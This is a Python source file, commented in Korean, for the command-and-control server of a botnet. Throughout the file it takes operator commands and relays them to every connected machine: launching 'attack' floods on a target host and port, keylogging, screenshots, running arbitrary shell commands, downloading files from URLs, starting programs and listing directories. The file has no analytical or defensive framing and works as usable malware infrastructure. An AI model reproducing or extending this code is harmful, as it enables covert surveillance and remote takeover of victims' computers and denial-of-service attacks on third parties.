import socket
import threading

# 서버 설정
SERVER_IP = '0.0.0.0'
SERVER_PORT = 8000

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_IP, SERVER_PORT))
server_socket.listen(5)

clients = []
target_client = None

def handle_client(client_socket):
    global target_client
    while True:
        try:
            message = client_socket.recv(1024).decode('utf-8')
            if not message:
                break

            print(f"Received: {message}")

            if message.lower().startswith("attack"):
                target, port = message.split()[1:]
                for client in clients:
                    client.send(f"attack {target} {port}".encode('utf-8'))

            elif message.lower() == "stop":
                for client in clients:
                    client.send("stop".encode('utf-8'))

            elif message.lower().startswith("connect"):
                target_client = client_socket
                client_ip = message.split()[1]
                for client in clients:
                    if client.getpeername()[0] == client_ip:
                        target_client = client

            elif message.lower() == "keylog":
                if target_client:
                    target_client.send("keylog".encode('utf-8'))

            elif message.lower() == "disconnect":
                if target_client:
                    target_client.send("disconnect".encode('utf-8'))
                    target_client = None

            elif message.lower() == "exit":
                client_socket.send("exit".encode('utf-8'))
                break

            elif message.lower().startswith("kick"):
                client_ip = message.split()[1]
                for client in clients:
                    if client.getpeername()[0] == client_ip:
                        client.send("kick".encode('utf-8'))
                        clients.remove(client)
                        client.close()

            elif message.lower().startswith("dir"):
                target_ip = message.split()[1]
                for client in clients:
                    client.send(f"dir {target_ip}".encode('utf-8'))

            elif message.lower().startswith("screenshot"):
                target_ip = message.split()[1]
                for client in clients:
                    client.send(f"screenshot {target_ip}".encode('utf-8'))

            elif message.lower().startswith("cmd"):
                target_ip, cmd_to_execute = message.split()[1], ' '.join(message.split()[2:])
                for client in clients:
                    client.send(f"cmd {target_ip} {cmd_to_execute}".encode('utf-8'))

            elif message.lower().startswith("download"):
                target_ip, url, download_path = message.split()[1], message.split()[2], message.split()[3]
                for client in clients:
                    client.send(f"download {target_ip} {url} {download_path}".encode('utf-8'))

            elif message.lower().startswith("start"):
                target_ip, program_path = message.split()[1], ' '.join(message.split()[2:])
                for client in clients:
                    client.send(f"start {target_ip} {program_path}".encode('utf-8'))

        except Exception as e:
            print(f"[-] Error: {e}")
            clients.remove(client_socket)
            client_socket.close()
            break

print(f"[*] Listening on {SERVER_IP}:{SERVER_PORT}")

while True:
    client_socket, addr = server_socket.accept()
    print(f"[+] Accepted connection from {addr}")
    clients.append(client_socket)
    client_handler = threading.Thread(target=handle_client, args=(client_socket,))
    client_handler.start()
